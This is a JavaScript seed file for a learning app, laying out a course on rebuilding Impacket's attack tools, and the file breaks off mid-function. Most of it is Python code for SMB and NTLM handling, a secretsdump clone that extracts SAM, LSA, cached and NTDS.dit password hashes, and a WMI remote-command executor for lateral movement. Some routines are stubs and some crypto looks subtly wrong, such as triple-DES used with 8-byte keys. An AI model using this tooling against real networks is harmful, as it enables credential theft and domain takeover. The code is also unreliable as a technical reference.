import Database from 'better-sqlite3';
import { join } from 'path';

const db = new Database(join(process.cwd(), 'data', 'quest-log.db'));

// Impacket Suite & CrackMapExec
const paths = [
  {
    name: 'Reimplement: Impacket Suite',
    description: 'Build the essential Impacket tools - secretsdump, wmiexec, psexec, smbexec, and dcomexec from scratch',
    icon: 'key',
    color: 'red',
    language: 'Python',
    skills: 'Windows protocols, SMB, WMI, DCOM, NTLM, Kerberos',
    difficulty: 'advanced',
    estimated_weeks: 10,
    schedule: `| Week | Day | Focus | Deliverable |
|------|-----|-------|-------------|
| 1 | 1 | SMB protocol basics | SMB header structures |
| 1 | 2 | SMB connection | TCP connection handler |
| 1 | 3 | SMB negotiate | Protocol negotiation |
| 1 | 4 | SMB session setup | NTLM authentication |
| 1 | 5 | SMB tree connect | Share connection |
| 2 | 1 | SMB file operations | Read/write files |
| 2 | 2 | SMB named pipes | IPC communication |
| 2 | 3 | DCE/RPC basics | RPC protocol structures |
| 2 | 4 | DCE/RPC bind | Service binding |
| 2 | 5 | DCE/RPC calls | Remote procedure calls |
| 3 | 1 | SAMR interface | User enumeration |
| 3 | 2 | LSARPC interface | SID lookups |
| 3 | 3 | DRSUAPI basics | Domain replication |
| 3 | 4 | secretsdump core | Credential extraction |
| 3 | 5 | NTDS.dit parsing | AD database parsing |
| 4 | 1 | SAM registry | Local credential extraction |
| 4 | 2 | LSA secrets | Service account passwords |
| 4 | 3 | Cached credentials | Domain cached creds |
| 4 | 4 | DPAPI integration | Protected data |
| 4 | 5 | secretsdump complete | Full credential dump |
| 5 | 1 | WMI protocol | DCOM/WMI basics |
| 5 | 2 | WMI authentication | NTLM over DCOM |
| 5 | 3 | WMI queries | WQL execution |
| 5 | 4 | Process creation | Win32_Process.Create |
| 5 | 5 | wmiexec complete | Remote command execution |
| 6 | 1 | Service control | SVCCTL interface |
| 6 | 2 | Service creation | Remote service install |
| 6 | 3 | Service execution | Command via service |
| 6 | 4 | Cleanup routines | Service removal |
| 6 | 5 | psexec complete | Full psexec clone |
| 7 | 1 | SMB command exec | Direct SMB execution |
| 7 | 2 | Output capture | Named pipe output |
| 7 | 3 | Interactive mode | Pseudo-shell |
| 7 | 4 | smbexec complete | SMB-based execution |
| 7 | 5 | DCOM activation | Object activation |
| 8 | 1 | MMC20.Application | DCOM lateral movement |
| 8 | 2 | ShellWindows | Explorer DCOM |
| 8 | 3 | ShellBrowserWindow | Browser DCOM |
| 8 | 4 | dcomexec complete | DCOM execution |
| 8 | 5 | Integration testing | All tools together |
| 9 | 1 | Kerberos integration | Ticket authentication |
| 9 | 2 | Pass-the-hash | Hash-based auth |
| 9 | 3 | Pass-the-ticket | Ticket-based auth |
| 9 | 4 | Error handling | Robust error handling |
| 9 | 5 | Logging system | Operation logging |
| 10 | 1 | Proxy support | SOCKS/HTTP proxy |
| 10 | 2 | Timeout handling | Connection timeouts |
| 10 | 3 | Multi-target | Multiple hosts |
| 10 | 4 | Output formats | JSON/CSV output |
| 10 | 5 | Final integration | Complete suite |`,
    modules: [
      {
        name: 'SMB Protocol Foundation',
        description: 'Implement SMB protocol from scratch',
        tasks: [
          {
            title: 'SMB Header Structures',
            description: 'Implement SMB2/3 header structures and constants',
            details: `# SMB2/3 Protocol Implementation

\`\`\`python
import struct
from dataclasses import dataclass
from enum import IntEnum, IntFlag
from typing import Optional
import socket
import hashlib
import hmac

class SMB2Command(IntEnum):
    NEGOTIATE = 0x0000
    SESSION_SETUP = 0x0001
    LOGOFF = 0x0002
    TREE_CONNECT = 0x0003
    TREE_DISCONNECT = 0x0004
    CREATE = 0x0005
    CLOSE = 0x0006
    FLUSH = 0x0007
    READ = 0x0008
    WRITE = 0x0009
    LOCK = 0x000A
    IOCTL = 0x000B
    CANCEL = 0x000C
    ECHO = 0x000D
    QUERY_DIRECTORY = 0x000E
    CHANGE_NOTIFY = 0x000F
    QUERY_INFO = 0x0010
    SET_INFO = 0x0011
    OPLOCK_BREAK = 0x0012

class SMB2Flags(IntFlag):
    SERVER_TO_REDIR = 0x00000001
    ASYNC_COMMAND = 0x00000002
    RELATED_OPERATIONS = 0x00000004
    SIGNED = 0x00000008
    DFS_OPERATIONS = 0x10000000
    REPLAY_OPERATION = 0x20000000

@dataclass
class SMB2Header:
    """SMB2 Header - 64 bytes"""
    protocol_id: bytes = b'\\xfeSMB'
    structure_size: int = 64
    credit_charge: int = 0
    status: int = 0
    command: int = 0
    credit_request: int = 0
    flags: int = 0
    next_command: int = 0
    message_id: int = 0
    reserved: int = 0
    tree_id: int = 0
    session_id: int = 0
    signature: bytes = b'\\x00' * 16

    def pack(self) -> bytes:
        return struct.pack(
            '<4sHHIHHIIQIIQ16s',
            self.protocol_id,
            self.structure_size,
            self.credit_charge,
            self.status,
            self.command,
            self.credit_request,
            self.flags,
            self.next_command,
            self.message_id,
            self.reserved,
            self.tree_id,
            self.session_id,
            self.signature
        )

    @classmethod
    def unpack(cls, data: bytes) -> 'SMB2Header':
        fields = struct.unpack('<4sHHIHHIIQIIQ16s', data[:64])
        return cls(
            protocol_id=fields[0],
            structure_size=fields[1],
            credit_charge=fields[2],
            status=fields[3],
            command=fields[4],
            credit_request=fields[5],
            flags=fields[6],
            next_command=fields[7],
            message_id=fields[8],
            reserved=fields[9],
            tree_id=fields[10],
            session_id=fields[11],
            signature=fields[12]
        )

@dataclass
class SMB2NegotiateRequest:
    """SMB2 NEGOTIATE Request"""
    structure_size: int = 36
    dialect_count: int = 0
    security_mode: int = 1  # Signing enabled
    reserved: int = 0
    capabilities: int = 0
    client_guid: bytes = b'\\x00' * 16
    negotiate_context_offset: int = 0
    negotiate_context_count: int = 0
    reserved2: int = 0
    dialects: list = None

    def __post_init__(self):
        if self.dialects is None:
            self.dialects = [0x0202, 0x0210, 0x0300, 0x0302, 0x0311]  # SMB 2.x and 3.x
            self.dialect_count = len(self.dialects)

    def pack(self) -> bytes:
        header = struct.pack(
            '<HHHI16sIHH',
            self.structure_size,
            self.dialect_count,
            self.security_mode,
            self.reserved,
            self.client_guid,
            self.negotiate_context_offset,
            self.negotiate_context_count,
            self.reserved2
        )
        dialects = b''.join(struct.pack('<H', d) for d in self.dialects)
        return header + dialects

class SMBConnection:
    """SMB2/3 Connection Handler"""

    def __init__(self, target: str, port: int = 445):
        self.target = target
        self.port = port
        self.socket: Optional[socket.socket] = None
        self.session_id = 0
        self.tree_id = 0
        self.message_id = 0
        self.dialect = 0
        self.signing_required = False
        self.session_key: Optional[bytes] = None

    def connect(self):
        """Establish TCP connection"""
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.settimeout(10)
        self.socket.connect((self.target, self.port))

    def disconnect(self):
        """Close connection"""
        if self.socket:
            self.socket.close()
            self.socket = None

    def _send_raw(self, data: bytes):
        """Send raw SMB data with NetBIOS header"""
        # NetBIOS Session Message
        netbios_header = struct.pack('>I', len(data))
        # Set message type to 0x00 (Session Message)
        netbios_header = b'\\x00' + netbios_header[1:]
        self.socket.sendall(netbios_header + data)

    def _recv_raw(self) -> bytes:
        """Receive raw SMB data"""
        # Read NetBIOS header
        header = self.socket.recv(4)
        if len(header) < 4:
            raise ConnectionError("Connection closed")

        length = struct.unpack('>I', b'\\x00' + header[1:])[0]

        # Read SMB data
        data = b''
        while len(data) < length:
            chunk = self.socket.recv(length - len(data))
            if not chunk:
                raise ConnectionError("Connection closed")
            data += chunk

        return data

    def _next_message_id(self) -> int:
        """Get next message ID"""
        mid = self.message_id
        self.message_id += 1
        return mid

    def _sign_message(self, message: bytes) -> bytes:
        """Sign SMB message if required"""
        if not self.signing_required or not self.session_key:
            return message

        # Zero out signature field
        message = message[:48] + b'\\x00' * 16 + message[64:]

        # Calculate signature
        signature = hmac.new(
            self.session_key,
            message,
            hashlib.sha256
        ).digest()[:16]

        # Insert signature
        return message[:48] + signature + message[64:]

    def negotiate(self) -> dict:
        """Perform SMB2 NEGOTIATE"""
        header = SMB2Header(
            command=SMB2Command.NEGOTIATE,
            credit_request=1,
            message_id=self._next_message_id()
        )

        negotiate = SMB2NegotiateRequest()

        message = header.pack() + negotiate.pack()
        self._send_raw(message)

        response = self._recv_raw()
        resp_header = SMB2Header.unpack(response)

        if resp_header.status != 0:
            raise Exception(f"Negotiate failed: {hex(resp_header.status)}")

        # Parse negotiate response
        resp_data = response[64:]
        self.dialect = struct.unpack('<H', resp_data[4:6])[0]
        security_mode = struct.unpack('<H', resp_data[2:4])[0]
        self.signing_required = (security_mode & 0x02) != 0

        return {
            'dialect': hex(self.dialect),
            'signing_required': self.signing_required
        }

# Usage example
if __name__ == "__main__":
    conn = SMBConnection("192.168.1.100")
    conn.connect()
    result = conn.negotiate()
    print(f"Negotiated: {result}")
\`\`\``
          },
          {
            title: 'NTLM Authentication',
            description: 'Implement NTLM authentication for SMB sessions',
            details: `# NTLM Authentication Implementation

\`\`\`python
import struct
import hashlib
import hmac
import os
from dataclasses import dataclass
from typing import Optional, Tuple
from Crypto.Cipher import ARC4, DES

class NTLMFlags:
    NEGOTIATE_56 = 0x80000000
    NEGOTIATE_KEY_EXCH = 0x40000000
    NEGOTIATE_128 = 0x20000000
    NEGOTIATE_VERSION = 0x02000000
    NEGOTIATE_TARGET_INFO = 0x00800000
    NEGOTIATE_EXTENDED_SESSIONSECURITY = 0x00080000
    NEGOTIATE_ALWAYS_SIGN = 0x00008000
    NEGOTIATE_NTLM = 0x00000200
    NEGOTIATE_SEAL = 0x00000020
    NEGOTIATE_SIGN = 0x00000010
    REQUEST_TARGET = 0x00000004
    NEGOTIATE_OEM = 0x00000002
    NEGOTIATE_UNICODE = 0x00000001

@dataclass
class NTLMNegotiate:
    """Type 1 - NTLM Negotiate Message"""
    signature: bytes = b'NTLMSSP\\x00'
    message_type: int = 1
    flags: int = (
        NTLMFlags.NEGOTIATE_56 |
        NTLMFlags.NEGOTIATE_KEY_EXCH |
        NTLMFlags.NEGOTIATE_128 |
        NTLMFlags.NEGOTIATE_EXTENDED_SESSIONSECURITY |
        NTLMFlags.NEGOTIATE_ALWAYS_SIGN |
        NTLMFlags.NEGOTIATE_NTLM |
        NTLMFlags.NEGOTIATE_SEAL |
        NTLMFlags.NEGOTIATE_SIGN |
        NTLMFlags.REQUEST_TARGET |
        NTLMFlags.NEGOTIATE_UNICODE
    )

    def pack(self) -> bytes:
        return struct.pack(
            '<8sIIHHIHHI',
            self.signature,
            self.message_type,
            self.flags,
            0, 0, 0,  # Domain (not used)
            0, 0, 0   # Workstation (not used)
        )

@dataclass
class NTLMChallenge:
    """Type 2 - NTLM Challenge Message"""
    signature: bytes = b''
    message_type: int = 0
    target_name: bytes = b''
    flags: int = 0
    challenge: bytes = b''
    reserved: bytes = b''
    target_info: bytes = b''

    @classmethod
    def unpack(cls, data: bytes) -> 'NTLMChallenge':
        signature = data[0:8]
        message_type = struct.unpack('<I', data[8:12])[0]

        target_len = struct.unpack('<H', data[12:14])[0]
        target_offset = struct.unpack('<I', data[16:20])[0]
        target_name = data[target_offset:target_offset + target_len]

        flags = struct.unpack('<I', data[20:24])[0]
        challenge = data[24:32]

        # Parse target info if present
        target_info = b''
        if len(data) > 44:
            info_len = struct.unpack('<H', data[40:42])[0]
            info_offset = struct.unpack('<I', data[44:48])[0]
            target_info = data[info_offset:info_offset + info_len]

        return cls(
            signature=signature,
            message_type=message_type,
            target_name=target_name,
            flags=flags,
            challenge=challenge,
            target_info=target_info
        )

class NTLMAuth:
    """NTLM Authentication Handler"""

    def __init__(self, username: str, password: str, domain: str = ''):
        self.username = username
        self.password = password
        self.domain = domain
        self.session_key: Optional[bytes] = None

    @staticmethod
    def _md4(data: bytes) -> bytes:
        """Calculate MD4 hash"""
        import hashlib
        return hashlib.new('md4', data).digest()

    @staticmethod
    def _des_encrypt(key: bytes, data: bytes) -> bytes:
        """DES encryption for LM hash"""
        # Expand 7-byte key to 8-byte DES key
        def expand_des_key(key7: bytes) -> bytes:
            key8 = bytearray(8)
            key8[0] = key7[0] >> 1
            key8[1] = ((key7[0] & 0x01) << 6) | (key7[1] >> 2)
            key8[2] = ((key7[1] & 0x03) << 5) | (key7[2] >> 3)
            key8[3] = ((key7[2] & 0x07) << 4) | (key7[3] >> 4)
            key8[4] = ((key7[3] & 0x0F) << 3) | (key7[4] >> 5)
            key8[5] = ((key7[4] & 0x1F) << 2) | (key7[5] >> 6)
            key8[6] = ((key7[5] & 0x3F) << 1) | (key7[6] >> 7)
            key8[7] = key7[6] & 0x7F
            # Set parity bits
            for i in range(8):
                key8[i] = (key8[i] << 1) & 0xFE
            return bytes(key8)

        cipher = DES.new(expand_des_key(key), DES.MODE_ECB)
        return cipher.encrypt(data)

    def nt_hash(self) -> bytes:
        """Calculate NT hash from password"""
        return self._md4(self.password.encode('utf-16-le'))

    def lm_hash(self) -> bytes:
        """Calculate LM hash (legacy, usually disabled)"""
        password = self.password.upper()[:14].ljust(14, '\\x00')
        magic = b'KGS!@#\$%'
        return (
            self._des_encrypt(password[:7].encode(), magic) +
            self._des_encrypt(password[7:14].encode(), magic)
        )

    def ntlmv2_response(self, challenge: bytes, target_info: bytes) -> Tuple[bytes, bytes]:
        """Calculate NTLMv2 response"""
        nt_hash = self.nt_hash()

        # NTLMv2 hash
        identity = (self.username.upper() + self.domain).encode('utf-16-le')
        ntlmv2_hash = hmac.new(nt_hash, identity, hashlib.md5).digest()

        # Client challenge
        client_challenge = os.urandom(8)

        # Timestamp (100-nanosecond intervals since Jan 1, 1601)
        import time
        timestamp = int((time.time() + 11644473600) * 10000000)
        timestamp_bytes = struct.pack('<Q', timestamp)

        # Build blob
        blob = struct.pack('<BBHI', 1, 1, 0, 0)  # Version, reserved
        blob += timestamp_bytes
        blob += client_challenge
        blob += struct.pack('<I', 0)  # Reserved
        blob += target_info
        blob += struct.pack('<I', 0)  # Reserved

        # NTLMv2 response
        temp = challenge + blob
        nt_proof = hmac.new(ntlmv2_hash, temp, hashlib.md5).digest()
        nt_response = nt_proof + blob

        # Session key
        session_key = hmac.new(ntlmv2_hash, nt_proof, hashlib.md5).digest()
        self.session_key = session_key

        return nt_response, session_key

    def create_authenticate_message(
        self,
        challenge_message: NTLMChallenge
    ) -> bytes:
        """Create Type 3 - NTLM Authenticate Message"""

        # Calculate NTLMv2 response
        nt_response, session_key = self.ntlmv2_response(
            challenge_message.challenge,
            challenge_message.target_info
        )

        # No LM response for NTLMv2
        lm_response = b'\\x00' * 24

        # Encode strings as UTF-16LE
        domain_bytes = self.domain.encode('utf-16-le')
        username_bytes = self.username.encode('utf-16-le')
        workstation_bytes = b'WORKSTATION'.encode('utf-16-le')

        # Build message
        flags = challenge_message.flags

        # Calculate offsets (header is 88 bytes)
        base_offset = 88
        lm_offset = base_offset
        nt_offset = lm_offset + len(lm_response)
        domain_offset = nt_offset + len(nt_response)
        user_offset = domain_offset + len(domain_bytes)
        workstation_offset = user_offset + len(username_bytes)
        session_offset = workstation_offset + len(workstation_bytes)

        # Pack header
        message = struct.pack(
            '<8sI',
            b'NTLMSSP\\x00',
            3  # Type 3
        )

        # LM response
        message += struct.pack('<HHI', len(lm_response), len(lm_response), lm_offset)

        # NT response
        message += struct.pack('<HHI', len(nt_response), len(nt_response), nt_offset)

        # Domain
        message += struct.pack('<HHI', len(domain_bytes), len(domain_bytes), domain_offset)

        # Username
        message += struct.pack('<HHI', len(username_bytes), len(username_bytes), user_offset)

        # Workstation
        message += struct.pack('<HHI', len(workstation_bytes), len(workstation_bytes), workstation_offset)

        # Encrypted session key (empty for now)
        message += struct.pack('<HHI', 0, 0, session_offset)

        # Flags
        message += struct.pack('<I', flags)

        # Pad to 88 bytes
        message += b'\\x00' * (88 - len(message))

        # Append data
        message += lm_response
        message += nt_response
        message += domain_bytes
        message += username_bytes
        message += workstation_bytes

        return message

# Usage
if __name__ == "__main__":
    auth = NTLMAuth("Administrator", "Password123", "DOMAIN")
    print(f"NT Hash: {auth.nt_hash().hex()}")

    # Negotiate message
    negotiate = NTLMNegotiate()
    print(f"Negotiate: {negotiate.pack().hex()}")
\`\`\``
          },
          {
            title: 'SecretsDump Core',
            description: 'Implement credential extraction via DRSUAPI',
            details: `# SecretsDump Implementation

\`\`\`python
import struct
from dataclasses import dataclass
from typing import Optional, List, Dict
from Crypto.Cipher import AES, DES3, ARC4
from Crypto.Hash import MD4, HMAC, MD5
import hashlib

class DRSUAPI:
    """DRSUAPI Interface for Domain Replication"""

    # DRSUAPI UUIDs
    MSRPC_UUID_DRSUAPI = "e3514235-4b06-11d1-ab04-00c04fc2dcd2"

    # Attributes to replicate
    NTDS_ATTRIBUTES = {
        'unicodePwd': '0x9005a',
        'ntPwdHistory': '0x9005b',
        'lmPwdHistory': '0x9005c',
        'supplementalCredentials': '0x9005e',
        'userAccountControl': '0x90060'
    }

    def __init__(self, smb_connection, domain_dn: str):
        self.smb = smb_connection
        self.domain_dn = domain_dn
        self.drs_handle = None
        self.domain_guid = None

    def drs_bind(self) -> bytes:
        """Bind to DRSUAPI interface"""
        # DRS_EXTENSIONS_INT structure
        extensions = struct.pack('<IIIII',
            48,  # cb
            0x04000000,  # flags
            0,  # SiteObjGuid
            0,  # pid
            0   # replicationEpoch
        )

        # DRS_BIND request
        bind_request = extensions

        # Make RPC call (simplified)
        response = self._rpc_call(0, bind_request)  # Opnum 0 = DRSBind

        # Parse response
        self.drs_handle = response[:20]
        return self.drs_handle

    def drs_domain_controller_info(self) -> Dict:
        """Get DC information"""
        # Build request
        request = struct.pack('<I', 1)  # InfoLevel
        request += self._pack_unicode_string(self.domain_dn)

        response = self._rpc_call(16, request)  # Opnum 16 = DRSDomainControllerInfo

        return self._parse_dc_info(response)

    def drs_get_nc_changes(self, user_dn: str) -> Dict:
        """
        Replicate user attributes (DRSGetNCChanges)
        This is the core of secretsdump
        """
        # Build DSNAME structure for target user
        dsname = self._build_dsname(user_dn)

        # Requested attributes
        partial_attr_set = self._build_partial_attr_set([
            0x9005a,  # unicodePwd (NT hash)
            0x9005b,  # ntPwdHistory
            0x9005c,  # lmPwdHistory
            0x9005e,  # supplementalCredentials
        ])

        # DRS_MSG_GETCHGREQ_V8 structure
        request = self.drs_handle
        request += struct.pack('<I', 8)  # InfoLevel (V8)
        request += dsname
        request += struct.pack('<Q', 0)  # usnvecFrom
        request += struct.pack('<I', 0)  # ulFlags
        request += struct.pack('<I', 1000)  # cMaxObjects
        request += struct.pack('<I', 0x7fffffff)  # cMaxBytes
        request += struct.pack('<I', 0)  # ulExtendedOp
        request += partial_attr_set

        response = self._rpc_call(3, request)  # Opnum 3 = DRSGetNCChanges

        return self._parse_replication_data(response)

    def _build_dsname(self, dn: str) -> bytes:
        """Build DSNAME structure"""
        dn_encoded = dn.encode('utf-16-le') + b'\\x00\\x00'

        dsname = struct.pack('<I', len(dn_encoded))  # NameLen
        dsname += struct.pack('<I', 0)  # SidLen
        dsname += b'\\x00' * 16  # Guid
        dsname += b'\\x00' * 28  # Sid
        dsname += dn_encoded

        return dsname

    def _build_partial_attr_set(self, attrs: List[int]) -> bytes:
        """Build PARTIAL_ATTR_VECTOR_V1_EXT"""
        pav = struct.pack('<II', 1, len(attrs))  # Version, cAttrs
        for attr in attrs:
            pav += struct.pack('<I', attr)
        return pav

    def _rpc_call(self, opnum: int, data: bytes) -> bytes:
        """Make DCE/RPC call"""
        # This would use the SMB named pipe \\pipe\\drsuapi
        # Simplified for demonstration
        pass

    def _parse_replication_data(self, data: bytes) -> Dict:
        """Parse DRS_MSG_GETCHGREPLY_V6"""
        result = {
            'nt_hash': None,
            'lm_hash': None,
            'history': [],
            'supplemental': None
        }

        # Parse replicated attributes
        # This is simplified - real implementation needs to handle
        # REPLENTINFLIST and REPLVALINF structures

        return result


class SecretsDump:
    """Main secretsdump implementation"""

    BOOTKEY_PATTERN = [0x8, 0x5, 0x4, 0x2]

    def __init__(self, target: str, username: str, password: str, domain: str = ''):
        self.target = target
        self.username = username
        self.password = password
        self.domain = domain
        self.smb = None
        self.drsuapi = None

    def connect(self):
        """Establish SMB connection and authenticate"""
        from smb_connection import SMBConnection

        self.smb = SMBConnection(self.target)
        self.smb.connect()
        self.smb.negotiate()
        self.smb.login(self.username, self.password, self.domain)

    def dump_sam(self) -> Dict[str, str]:
        """Dump local SAM database (local admin required)"""

        # Read SAM and SYSTEM hives from registry
        sam_data = self._read_registry_hive('SAM')
        system_data = self._read_registry_hive('SYSTEM')

        # Extract boot key from SYSTEM hive
        boot_key = self._extract_boot_key(system_data)

        # Decrypt SAM with boot key
        hashed_boot_key = self._hash_boot_key(boot_key, sam_data)

        # Extract user hashes
        users = {}
        for rid, encrypted_hash in self._enumerate_sam_users(sam_data):
            nt_hash = self._decrypt_sam_hash(encrypted_hash, hashed_boot_key, rid)
            users[rid] = nt_hash.hex()

        return users

    def dump_lsa_secrets(self) -> Dict[str, bytes]:
        """Dump LSA secrets (service account passwords, etc)"""

        secrets = {}

        # Read SECURITY hive
        security_data = self._read_registry_hive('SECURITY')
        system_data = self._read_registry_hive('SYSTEM')

        boot_key = self._extract_boot_key(system_data)
        lsa_key = self._extract_lsa_key(security_data, boot_key)

        # Enumerate secrets
        for secret_name in self._enumerate_lsa_secrets(security_data):
            encrypted = self._read_lsa_secret(security_data, secret_name)
            decrypted = self._decrypt_lsa_secret(encrypted, lsa_key)
            secrets[secret_name] = decrypted

        return secrets

    def dump_cached_creds(self) -> List[Dict]:
        """Dump domain cached credentials (DCC2)"""

        cached = []

        security_data = self._read_registry_hive('SECURITY')
        system_data = self._read_registry_hive('SYSTEM')

        boot_key = self._extract_boot_key(system_data)
        lsa_key = self._extract_lsa_key(security_data, boot_key)
        nlkm_key = self._extract_nlkm_key(security_data, lsa_key)

        for entry in self._enumerate_cached_creds(security_data):
            decrypted = self._decrypt_cached_cred(entry, nlkm_key)
            # Format: \$DCC2\$10240#username#hash
            cached.append({
                'username': decrypted['username'],
                'domain': decrypted['domain'],
                'hash': f"\$DCC2\$10240#{decrypted['username']}#{decrypted['hash']}"
            })

        return cached

    def dump_ntds(self) -> Dict[str, Dict]:
        """Dump NTDS.dit via DRSUAPI"""

        users = {}

        # Bind to DRSUAPI
        domain_dn = self._get_domain_dn()
        self.drsuapi = DRSUAPI(self.smb, domain_dn)
        self.drsuapi.drs_bind()

        # Enumerate domain users
        for user_dn in self._enumerate_domain_users():
            result = self.drsuapi.drs_get_nc_changes(user_dn)

            if result['nt_hash']:
                username = self._extract_username(user_dn)
                users[username] = {
                    'nt_hash': result['nt_hash'].hex(),
                    'lm_hash': result['lm_hash'].hex() if result['lm_hash'] else 'aad3b435b51404eeaad3b435b51404ee',
                    'history': result['history']
                }

        return users

    def _extract_boot_key(self, system_data: bytes) -> bytes:
        """Extract boot key from SYSTEM hive"""

        # Boot key is stored across 4 registry keys in scrambled form
        # JD, Skew1, GBG, Data under SYSTEM\\CurrentControlSet\\Control\\Lsa

        boot_key_parts = []
        key_names = ['JD', 'Skew1', 'GBG', 'Data']

        for key_name in key_names:
            # Extract class name from registry key (contains boot key part)
            class_name = self._get_reg_key_class(system_data,
                f"ControlSet001\\\\Control\\\\Lsa\\\\{key_name}")
            boot_key_parts.append(bytes.fromhex(class_name))

        # Combine and descramble
        boot_key = b''.join(boot_key_parts)
        descrambled = bytes([boot_key[self.BOOTKEY_PATTERN[i % 4] + (i // 4) * 4]
                           for i in range(16)])

        return descrambled

    def _decrypt_sam_hash(
        self,
        encrypted: bytes,
        hashed_boot_key: bytes,
        rid: int
    ) -> bytes:
        """Decrypt SAM hash entry"""

        # Different decryption for different SAM versions
        if len(encrypted) == 56:
            # AES encrypted (Windows 10+)
            iv = encrypted[:16]
            enc_hash = encrypted[16:32]
            cipher = AES.new(hashed_boot_key[:16], AES.MODE_CBC, iv)
            decrypted = cipher.decrypt(enc_hash)
        else:
            # RC4/DES encrypted (legacy)
            rc4_key = hashlib.md5(
                hashed_boot_key[:16] +
                struct.pack('<I', rid) +
                b"NTPASSWORD\\x00"
            ).digest()
            decrypted = ARC4.new(rc4_key).decrypt(encrypted)

        # Remove DES layer
        return self._des_decrypt_hash(decrypted, rid)

    def _des_decrypt_hash(self, encrypted: bytes, rid: int) -> bytes:
        """Final DES decryption of hash"""

        # Split RID into two DES keys
        key1 = self._rid_to_des_key(rid)
        key2 = self._rid_to_des_key(rid >> 8 | (rid << 24 & 0xFFFFFFFF))

        cipher1 = DES3.new(key1, DES3.MODE_ECB)
        cipher2 = DES3.new(key2, DES3.MODE_ECB)

        return cipher1.decrypt(encrypted[:8]) + cipher2.decrypt(encrypted[8:16])

    def _rid_to_des_key(self, rid: int) -> bytes:
        """Convert RID to DES key"""
        s = struct.pack('<I', rid) + struct.pack('<I', rid)

        key = bytearray(8)
        key[0] = s[0] >> 1
        key[1] = ((s[0] & 0x01) << 6) | (s[1] >> 2)
        key[2] = ((s[1] & 0x03) << 5) | (s[2] >> 3)
        key[3] = ((s[2] & 0x07) << 4) | (s[3] >> 4)
        key[4] = ((s[3] & 0x0f) << 3) | (s[4] >> 5)
        key[5] = ((s[4] & 0x1f) << 2) | (s[5] >> 6)
        key[6] = ((s[5] & 0x3f) << 1) | (s[6] >> 7)
        key[7] = s[6] & 0x7f

        for i in range(8):
            key[i] = (key[i] << 1) & 0xfe

        return bytes(key)

# Usage
if __name__ == "__main__":
    dumper = SecretsDump(
        target="192.168.1.100",
        username="Administrator",
        password="Password123",
        domain="CORP"
    )

    dumper.connect()

    # Dump SAM (local)
    print("=== SAM Hashes ===")
    for user, hash in dumper.dump_sam().items():
        print(f"{user}:aad3b435b51404eeaad3b435b51404ee:{hash}:::")

    # Dump LSA Secrets
    print("\\n=== LSA Secrets ===")
    for name, value in dumper.dump_lsa_secrets().items():
        print(f"{name}: {value}")

    # Dump NTDS.dit
    print("\\n=== NTDS.dit ===")
    for user, hashes in dumper.dump_ntds().items():
        print(f"{user}:{hashes['lm_hash']}:{hashes['nt_hash']}:::")
\`\`\``
          }
        ]
      },
      {
        name: 'WMI Execution',
        description: 'Remote command execution via WMI',
        tasks: [
          {
            title: 'WMIExec Implementation',
            description: 'Execute commands remotely via WMI',
            details: `# WMIExec Implementation

\`\`\`python
import struct
import uuid
from dataclasses import dataclass
from typing import Optional, Tuple
from dcom import DCOMConnection
from smb_connection import SMBConnection

class WMIExec:
    """
    Execute commands remotely via WMI
    Uses DCOM to access Win32_Process.Create
    """

    # IWbemServices interface
    CLSID_WbemLocator = "4590f811-1d3a-11d0-891f-00aa004b2e24"
    IID_IWbemServices = "9556dc99-828c-11cf-a37e-00aa003240c7"
    IID_IWbemLevel1Login = "f309ad18-d86a-11d0-a075-00c04fb68820"

    def __init__(
        self,
        target: str,
        username: str,
        password: str,
        domain: str = '',
        share: str = 'ADMIN\$'
    ):
        self.target = target
        self.username = username
        self.password = password
        self.domain = domain
        self.share = share
        self.dcom: Optional[DCOMConnection] = None
        self.smb: Optional[SMBConnection] = None
        self.wbem_services = None

    def connect(self):
        """Establish DCOM connection to WMI"""

        # Create DCOM connection
        self.dcom = DCOMConnection(
            self.target,
            self.username,
            self.password,
            self.domain
        )
        self.dcom.connect()

        # Get IWbemLevel1Login interface
        iwbem_login = self.dcom.get_interface(
            self.CLSID_WbemLocator,
            self.IID_IWbemLevel1Login
        )

        # Connect to namespace (root\\cimv2)
        self.wbem_services = self._wbem_login(iwbem_login, "root\\\\cimv2")

        # Also connect to SMB for output retrieval
        self.smb = SMBConnection(self.target)
        self.smb.connect()
        self.smb.negotiate()
        self.smb.login(self.username, self.password, self.domain)
        self.smb.tree_connect(self.share)

    def _wbem_login(self, iwbem_login, namespace: str):
        """
        Call IWbemLevel1Login::NTLMLogin
        Returns IWbemServices interface
        """

        # Build NTLMLogin request
        request = self._pack_bstr(namespace)
        request += self._pack_bstr("")  # Locale (empty)
        request += struct.pack('<I', 0)  # SecurityFlags
        request += struct.pack('<I', 0)  # AuthenticationLevel

        # Make DCOM call
        response = self.dcom.call_method(
            iwbem_login,
            3,  # NTLMLogin method index
            request
        )

        # Parse response - get IWbemServices interface
        return self._parse_interface_pointer(response)

    def execute(self, command: str, output: bool = True) -> Optional[str]:
        """
        Execute command via Win32_Process.Create

        Args:
            command: Command to execute
            output: Whether to capture output

        Returns:
            Command output if output=True, else None
        """

        if output:
            # Create temp file for output
            output_file = f"\\\\Windows\\\\Temp\\\\{uuid.uuid4().hex[:8]}.txt"
            full_command = f"cmd.exe /Q /c {command} > {output_file} 2>&1"
        else:
            full_command = f"cmd.exe /Q /c {command}"

        # Get Win32_Process class
        win32_process = self._get_wmi_object("Win32_Process")

        # Call Create method
        # Parameters: CommandLine, CurrentDirectory, ProcessStartupInfo
        params = self._build_process_params(full_command)

        result = self.dcom.call_method(
            win32_process,
            6,  # Create method index
            params
        )

        # Parse result
        return_value, process_id = self._parse_create_result(result)

        if return_value != 0:
            raise Exception(f"Process creation failed with code {return_value}")

        print(f"[*] Process created with PID: {process_id}")

        if output:
            # Wait for process and read output
            import time
            time.sleep(2)  # Wait for command to complete

            output_data = self._read_output_file(output_file)
            self._delete_output_file(output_file)

            return output_data

        return None

    def _get_wmi_object(self, class_name: str):
        """Get WMI object by class name"""

        # IWbemServices::GetObject
        request = self._pack_bstr(class_name)
        request += struct.pack('<I', 0)  # Flags
        request += struct.pack('<I', 0)  # Context

        response = self.dcom.call_method(
            self.wbem_services,
            6,  # GetObject method index
            request
        )

        return self._parse_interface_pointer(response)

    def _build_process_params(self, command: str) -> bytes:
        """Build Win32_Process.Create parameters"""

        # CommandLine parameter
        params = self._pack_bstr(command)

        # CurrentDirectory (NULL)
        params += struct.pack('<I', 0)

        # ProcessStartupInformation (minimal)
        # Win32_ProcessStartup object
        startup_info = self._create_startup_info()
        params += startup_info

        return params

    def _create_startup_info(self) -> bytes:
